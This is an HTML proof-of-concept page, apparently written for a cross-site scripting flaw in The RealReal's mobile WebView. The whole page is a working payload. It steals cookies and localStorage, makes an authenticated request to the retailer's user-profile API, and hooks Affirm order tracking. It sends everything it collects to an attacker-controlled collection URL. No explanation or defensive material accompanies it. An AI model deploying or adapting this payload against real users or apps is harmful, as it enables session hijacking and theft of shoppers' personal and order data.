<!DOCTYPE html>
<html>
<head>
    <title>XSS PoC</title>
</head>
<body>
    <h1>XSS in The RealReal WebView</h1>
    <div id="output"></div>

    <script>
        // Function to log and exfiltrate data
        function exfiltrate(data) {
            fetch('https://attacker.com/collect', {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(data)
            });
            document.getElementById('output').innerHTML += '<br>' + JSON.stringify(data);
        }

        // 1. Steal cookies
        const cookies = document.cookie;
        exfiltrate({ type: 'cookies', data: cookies });

        // 2. Steal localStorage
        const storage = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            storage[key] = localStorage.getItem(key);
        }
        exfiltrate({ type: 'localStorage', data: storage });

        // 3. Make authenticated API request
        fetch('https://api.therealreal.com/v2/user/profile', {
            credentials: 'include'
        })
        .then(r => r.json())
        .then(data => exfiltrate({ type: 'api', data }));

        // 4. Hook into Affirm if present
        if (window.affirm) {
            const originalTrack = affirm.analytics.trackOrderConfirmed;
            affirm.analytics.trackOrderConfirmed = function(order, products) {
                exfiltrate({ type: 'affirm_order', order, products });
                return originalTrack.apply(this, arguments);
            };
        }
    </script>
</body>
</html>
